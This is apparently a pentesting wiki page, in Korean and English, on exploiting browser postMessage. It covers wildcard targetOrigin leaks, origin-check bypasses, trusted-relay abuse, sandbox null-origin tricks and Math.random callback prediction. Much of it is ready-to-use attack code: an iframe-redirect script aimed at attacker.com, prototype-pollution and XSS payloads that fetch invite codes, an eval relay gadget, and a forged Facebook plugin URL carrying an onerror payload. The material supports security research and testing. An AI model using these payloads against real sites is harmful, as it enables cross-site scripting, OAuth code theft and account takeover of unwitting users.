# PostMessage 취약점

{{#include ../../banners/hacktricks-training.md}}

## 전송 **PostMessage**

**PostMessage**는 메시지를 보내기 위해 다음 함수를 사용합니다:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
참고로 **targetOrigin**은 '\*' 또는 _https://company.com._ 같은 URL일 수 있습니다.\
두 번째 시나리오에서는, **메시지는 해당 도메인으로만 전송될 수 있습니다** (window object의 origin이 다르더라도).\
만약 **wildcard**가 사용되면, **메시지는 어떤 도메인으로든 전송될 수 있습니다**, 그리고 Window object의 origin으로 전송됩니다.

### Attacking iframe & wildcard in **targetOrigin**

설명한 바와 같이 [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)에서, `X-Frame-Header` 보호가 없어 **iframed** 가능한 페이지를 찾고, 그 페이지가 **wildcard** (\*)를 사용해 **postMessage**로 민감한 메시지를 전송하고 있다면, 당신은 **iframe**의 **origin**을 수정해서 그 민감한 메시지를 당신이 제어하는 도메인으로 leak시킬 수 있습니다.\
페이지를 iframed할 수 있지만 **targetOrigin**이 **wildcard**가 아니라 URL로 설정되어 있다면, 이 **공격은 작동하지 않습니다**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`**는 JS에서 **`postMessages`를 기대하는** 함수를 선언할 때 사용하는 함수입니다.\
다음과 유사한 코드가 사용됩니다:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### 열거

현재 페이지에서 **event listeners**를 찾으려면 다음을 수행할 수 있다:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) you can often find a **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:

- **Open the victim page in a popup/iframe that has an `opener`** so its handlers register (many pixels/SDKs only attach listeners when `window.opener` exists).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, populating message fields you want injected (message type, tokens, nonces).
- Because the message now comes **from the trusted origin**, origin-only validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`, then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`** in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs** and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.
- Any relay that reflects arbitrary fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.

Hunting tips: enumerate `postMessage` listeners that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
메시지의 **`e.source`**를 null로 만들려면 **postMessage**를 **보내는** **iframe**을 생성하고 **즉시 삭제**하면 됩니다.

자세한 내용은 **읽어보세요:**

{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

이러한 공격을 수행하려면 이상적으로 **put the victim web page**를 `iframe` 안에 넣을 수 있어야 합니다. 그러나 `X-Frame-Header` 같은 일부 헤더는 그 **동작을** **방해**할 수 있습니다.\
그런 경우에는 덜 은밀한 공격을 사용할 수 있습니다. 취약한 웹 애플리케이션을 새 탭에서 열고 그와 통신할 수 있습니다:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### 메인 페이지를 차단하여 child로 전송된 메시지 훔치기

다음 페이지에서는 데이터를 전송하기 전에 **main** 페이지를 **차단**하고, **child iframe**의 **XSS**를 악용해 수신되기 전에 **민감한 postmessage 데이터**를 **leak**하는 방법을 볼 수 있습니다:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe 위치를 변경해 메시지 훔치기

만약 X-Frame-Header가 없는 웹페이지를 iframe으로 포함할 수 있고 그 페이지가 또 다른 iframe을 포함한다면, 공격자는 **해당 child iframe의 위치를 변경**할 수 있습니다. 따라서 그 iframe이 **postmessage**를 **wildcard**로 전송받고 있다면, 공격자는 그 iframe의 **origin**을 자신이 **제어하는** 페이지로 **변경**하여 메시지를 **탈취**할 수 있습니다:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

데이터가 `postMessage`를 통해 전송되어 JS에서 실행되는 시나리오에서는, 해당 페이지를 **iframe**으로 삽입하고 `postMessage`로 **exploit**을 전송하여 **prototype pollution/XSS**를 악용할 수 있습니다.

`postMessage`를 통한 매우 잘 설명된 XSS 사례는 [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)에서 확인할 수 있습니다.

`iframe`으로의 `postMessage`를 통해 **Prototype Pollution and then XSS**를 악용하는 익스플로잇 예시:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
**자세한 정보**:

- [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)에 대한 링크
- [**XSS**](../xss-cross-site-scripting/index.html)에 대한 링크
- [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)에 대한 링크

### Trusted-origin allowlist isn't a boundary

엄격한 `event.origin` 검사는 **신뢰된 출처가 공격자 JS를 실행할 수 없는 경우에만** 작동한다. 권한이 높은 페이지가 타사 iframe을 포함하고 `event.origin === "https://partner.com"`가 안전하다고 가정하면, `partner.com`의 어떤 XSS든 부모로 가는 다리가 된다:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
실제 사례에서 관찰된 공격 패턴:

1. **Exploit XSS in the partner iframe** 및 릴레이 가젯을 심어 모든 `postMessage`가 신뢰된 출처 내부에서 code exec가 되도록 한다:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, 손상된 iframe에 JS를 보내 허용된 메시지 타입을 부모 창으로 전달하게 합니다. 메시지는 `partner.com`에서 시작하여 allowlist를 통과하고, 안전하지 않게 삽입되는 HTML을 포함합니다:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. 부모가 공격자 HTML을 주입해 **JS execution in the parent origin** (예: `facebook.com`)을 허용하면, 이를 이용해 OAuth 코드를 탈취하거나 계정 완전 탈취 흐름으로 전환할 수 있다.

핵심 요점:

- **Partner origin isn't a boundary**: 'trusted' 파트너에서 발생한 어떤 XSS든 공격자가 허용된 메시지를 보내 `event.origin` 체크를 우회하게 한다.
- 핸들러가 **render partner-controlled payloads**(예: 특정 메시지 타입에서의 `innerHTML`)를 수행하면, 파트너가 침해되었을 때 same-origin DOM XSS가 된다.
- 광범위한 **message surface**(많은 타입, 구조 검증 없음)는 파트너 iframe이 침해된 이후 pivot을 위한 더 많은 기회를 제공한다.

### postMessage 브리지에서 **`Math.random()`** 콜백 토큰 예측하기

메시지 검증이 `Math.random()`으로 생성된 “shared secret”(예: `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`)을 사용하고, 동일한 헬퍼가 플러그인 iframe의 이름도 지정한다면 PRNG 출력을 복원하여 신뢰된 메시지를 위조할 수 있다:

- **Leak PRNG outputs via `window.name`:** SDK가 `guid()`로 플러그인 iframe의 이름을 자동 설정한다. 당신이 top frame을 제어할 수 있다면 피해자 페이지를 iframe으로 넣고, 플러그인 iframe을 당신의 origin으로 이동시킨 후(예: `window.frames[0].frames[0].location='https://attacker.com'`) `window.frames[0].frames[0].name`을 읽어 원시 `Math.random()` 출력을 얻을 수 있다.
- **Force more outputs without reloads:** 일부 SDK는 reinit 경로를 노출한다; FB SDK에서는 `init:post`를 `{xfbml:1}`과 함께 발생시키면 `XFBML.parse()`가 호출되어 플러그인 iframe을 파괴/재생성하고 새 이름/콜백 ID를 생성한다. 반복 reinit은 필요한 만큼의 PRNG 출력을 생성한다(콜백/iframe ID를 위한 추가 내부 `Math.random()` 호출이 있으니 중간 값을 건너뛰어야 한다).
- **Trusted-origin delivery via parameter pollution:** 일차 도메인 플러그인 엔드포인트가 무검증 파라미터를 cross-window payload에 반영한다면(예: `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), 신뢰된 `facebook.com` origin을 유지한 채 `&type=...&iconSVG=...`를 주입할 수 있다.
- **Predict the next callback:** 누출된 iframe 이름을 `[0,1)` 범위의 부동소수점으로 복원하고 여러 값(비연속 값도 가능)을 V8 `Math.random` 예측기(예: Z3-based)에 입력한다. 그런 다음 로컬에서 다음 `guid()`를 생성해 기대되는 콜백 토큰을 위조한다.
- **Trigger the sink:** postMessage 데이터를 조작해 브리지가 `xd.mpn.setupIconIframe`을 디스패치하고 `iconSVG`에 HTML을 주입하도록 한다(예: URL-encoded `<img src=x onerror=...>`). 이렇게 하면 호스팅 도메인 내에서 DOM XSS가 발생하고, 거기서부터 same-origin iframes(OAuth dialogs, arbiters 등)을 읽을 수 있다.
- **Framing quirks help:** 이 체인은 framing을 필요로 한다. 일부 모바일 webview에서는 `frame-ancestors`가 있을 때 `X-Frame-Options`가 지원되지 않는 `ALLOW-FROM`으로 저하될 수 있고, “compat” 파라미터가 관대한 `frame-ancestors`를 강제해 `window.name` side channel를 가능하게 할 수 있다.

#### 최소 위조 메시지 예시
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 참고자료

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- 연습용: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
